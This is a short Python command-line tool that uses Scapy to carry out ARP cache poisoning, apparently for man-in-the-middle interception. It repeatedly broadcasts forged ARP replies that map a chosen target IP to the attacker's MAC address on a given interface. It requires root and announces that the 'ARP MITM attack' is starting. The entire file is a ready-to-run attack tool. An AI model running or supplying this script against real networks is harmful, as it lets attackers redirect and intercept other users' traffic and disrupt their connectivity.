# pylint: disable=invalid-name

from argparse import ArgumentParser
from os import geteuid
from sys import exit as sysexit

from scapy.layers.l2 import Ether, ARP, get_if_hwaddr
from scapy.sendrecv import sendp

VERSION = "1.2.1"


def arp_mitm(interface, target, interval=10.0):
    """
    ARP cache poisoning attack.
    """

    my_mac = get_if_hwaddr(interface)

    sendp(
        Ether(dst="FF:FF:FF:FF:FF:FF") /
        ARP(op="is-at", psrc=target, hwsrc=my_mac),
        iface=interface,
        inter=interval,
        loop=True
    )


def get_arg_parser():
    """
    Returns the argument parser.
    """

    arg_parser = ArgumentParser(
        description="ARP cache poisoning implementation using Scapy"
    )
    arg_parser.add_argument(
        "-i", "--interface",
        required=True, help="network interface to use"
    )
    arg_parser.add_argument(
        "-t", "--target",
        required=True, help="target's IP address"
    )
    arg_parser.add_argument(
        "-I", "--interval",
        type=float, default=10.0,
        help="seconds between two ARP frames (default: 10.0s)"
    )
    arg_parser.add_argument(
        "--version", action="version", version=VERSION
    )

    return arg_parser


if __name__ == "__main__":

    ARGS = vars(get_arg_parser().parse_args())

    if not geteuid() == 0:
        sysexit("[!] You must be root")

    try:
        print("[*] Starting the ARP MITM attack...")
        arp_mitm(ARGS["interface"], ARGS["target"], ARGS["interval"])
    except IOError:
        sysexit("[!] Interface doesn't exist")
    finally:
        print("\n[*] Stopping the ARP MITM attack")
